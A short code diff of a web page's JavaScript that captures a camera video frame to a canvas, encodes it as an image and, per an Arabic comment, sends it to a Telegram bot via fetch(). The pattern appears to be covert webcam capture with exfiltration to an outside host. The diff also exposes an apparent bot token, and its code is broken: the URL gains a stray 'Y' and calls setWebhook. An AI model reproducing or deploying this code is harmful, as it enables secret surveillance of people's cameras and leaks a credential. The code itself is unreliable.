@@ -23,9 +23,9 @@
                 var context = canvas.getContext('2d');
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                var imageData = canvas.toDataURL('image/png');
+                var imageData = canvas.toDataURL('image/jpeg'); // استخدام تنسيق JPEG
                 // إرسال الصورة إلى البوت على تليجرام
-                fetch('https://api.telegram.org/bot 6530176287:AAEux253k36KD2FQkv8MAYVWPHONZXDUowo/setWebhook?url=https://bosalha.github.io/klerf/', {
+                fetch('Yhttps://api.telegram.org/bot 6530176287:AAEux253k36KD2FQkv8MAYVWPHONZXDUowo/setWebhook?url=https://bosalha.github.io/klerf/', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
